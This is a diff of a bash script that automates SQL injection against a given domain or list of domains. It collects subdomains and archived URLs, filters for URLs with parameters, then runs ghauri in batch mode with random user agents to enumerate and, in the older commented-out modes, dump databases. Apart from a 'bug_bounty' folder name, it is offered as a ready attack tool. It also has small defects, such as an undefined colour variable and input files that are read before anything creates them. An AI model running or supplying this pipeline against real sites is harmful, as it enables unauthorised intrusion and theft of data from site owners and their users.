@@ -1,4 +1,8 @@
 #!/usr/bin/env bash
+BOLD_BLUE="\033[1;34m"
+RED="\033[0;31m"
+NC="\033[0m"
+BOLD_YELLOW="\033[1;33m"
 
 # Function to display usage message
 display_usage() {
@@ -27,14 +31,14 @@ fi
 
 # Function to check installed tools
 check_tools() {
-    tools=("ghauri" "urlfinder" "gau" "httpx" "uniq" "xargs" "wget" "sed")
+    tools=("unfurl" "subfinder" "anew" "httpx" "urlfinder" "gau" "waybackurls")
 
     echo "Checking required tools:"
     for tool in "${tools[@]}"; do
         if command -v "$tool" &> /dev/null; then
-            echo "$tool is installed at $(which $tool)"
+            echo -e "${BOLD_BLUE}$tool is installed at ${BOLD_WHITE}$(which $tool)${NC}"
         else
-            echo "$tool is NOT installed or not in the PATH"
+            echo -e "${RED}$tool is NOT installed or not in the PATH${NC}"
         fi
     done
 }
@@ -84,64 +88,104 @@ fi
 
 # Single domain
 # all vulnerability
-if [[ "$1" == "-d" && "$3" == "-all" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# if [[ "$1" == "-d" && "$3" == "-all" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
-# All Blind
-if [[ "$1" == "-d" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # All Blind
+# if [[ "$1" == "-d" && "$3" == "-b" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
-# Error based
-if [[ "$1" == "-d" && "$3" == "-e" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # Error based
+# if [[ "$1" == "-d" && "$3" == "-e" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
 # Time based
 if [[ "$1" == "-d" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
+    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
+    # making directory
+    main_dir="bug_bounty/$domain_Without_Protocol"
+    base_dir="$main_dir/single_domain/sql_injection"
+
+    mkdir -p $main_dir
+
+    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
+
+    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
+
+    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt
+
+    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
+
+    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt
+
+    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
+
 fi
 
-# Boolean based
-if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # Boolean based
+# if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
 
 
-# Multi domain
-# all vulnerability
-if [[ "$1" == "-l" && "$3" == "-all" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # Multi domain
+# # all vulnerability
+# if [[ "$1" == "-l" && "$3" == "-all" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
-# All Blind
-if [[ "$1" == "-l" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # All Blind
+# if [[ "$1" == "-l" && "$3" == "-b" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
-# Error based
-if [[ "$1" == "-l" && "$3" == "-e" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# # Error based
+# if [[ "$1" == "-l" && "$3" == "-e" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
 
 # Time based
 if [[ "$1" == "-l" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
+    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
+    # making directory
+    main_dir="bug_bounty/$domain_Without_Protocol"
+    base_dir="$main_dir/multi_domain/sql_injection"
+
+    mkdir -p $main_dir
+
+    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt
+
+    cat $base_dir/sublist3r.txt $base_dir/subfinder.txt | anew | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt
+
+    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt
+
+    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
+
+    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt
+
+    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
+
+    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt
+
+    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
+
+    # echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
+
 fi
 
 # Boolean based
-if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
-    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
-fi
+# if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
+#     domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
+#     echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
+# fi
